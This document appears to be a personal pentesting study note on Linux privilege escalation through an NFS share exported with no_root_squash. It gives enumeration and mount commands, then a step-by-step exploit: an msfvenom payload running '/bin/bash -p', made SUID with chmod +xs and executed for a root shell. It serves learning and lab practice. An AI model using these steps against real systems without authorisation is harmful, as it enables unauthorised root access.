**Useful Commands**

show NFS server's export list
```
showmount -e <target>
```

similar nmap script
```
nmap -sV --script=nfs-showmount <target>
```

mount an NFS share
```
mount -o rw,vers=2 <target>:<share> <local_directory>
```



**Root Squashing**
if the remote user is root (uid = 0), NFS squashes user and treats them as a nogroup user
- can be disabled with "no_root_squash"
- when included in a writable share config, the user can create files as the "local" root user


checking config
- with lse (level 2)
![](assets/Pasted%20image%2020260531162707.png)

- manually
`cat /etc/exports`
![](assets/Pasted%20image%2020260531162732.png)

check if `/tmp` share is available for mount
```
showmount -e <target>
```
![](assets/Pasted%20image%2020260531162820.png)
- this output is good

create a share folder and mount the nfs share
```
mkdir /tmp/nfs
mount -o rw,vers=2 <target>:/tmp /tmp/nfs
```


create msfvenom shell
```
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```
- this is being run as the root user

change permissions
```
chmod +xs /tmp/nfs/shell.elf
```

confirm the file was created and run it
![](assets/Pasted%20image%2020260531163042.png)
```
/tmp/shell.elf
```
![](assets/Pasted%20image%2020260531163059.png)